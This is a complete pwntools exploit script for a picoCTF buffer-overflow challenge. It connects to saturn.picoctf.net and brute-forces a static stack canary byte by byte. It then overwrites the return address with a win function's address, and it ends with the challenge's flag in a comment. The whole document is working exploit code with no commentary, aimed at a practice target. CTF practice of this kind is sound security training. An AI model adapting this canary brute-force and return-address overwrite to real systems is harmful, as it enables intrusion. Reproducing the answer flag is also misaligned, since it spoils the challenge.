from pwn import *

file = "./vuln"
host = "saturn.picoctf.net"
port = 50350
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

win = 0x08049336
BUFSIZE = 64

canary = ""
while len(canary) < 4:
    for i in range(256):
        #io = process("./vuln")
        io = remote(host, port)
        io.sendlineafter("> ", "{}".format(BUFSIZE + len(canary) + 1))
        io.sendlineafter("Input> ", "A" * BUFSIZE + canary + "{}".format(chr(i)))
        if "*** Stack Smashing Detected" not in str(io.recvline()):
            canary += chr(i)
            log.info("canary: {}".format(canary))
            break
        io.close()

log.info("Found canary: {}".format(canary))

io = remote(host, port)
io.sendlineafter("> ", "-1")
pld = b"A"*64 + bytes(canary, 'utf-8') + b"B"*16 + p32(win)
io.sendlineafter("Input> ", pld)
print(io.recvline())

io.interactive()
#picoCTF{Stat1C_c4n4r13s_4R3_b4D_32625866}
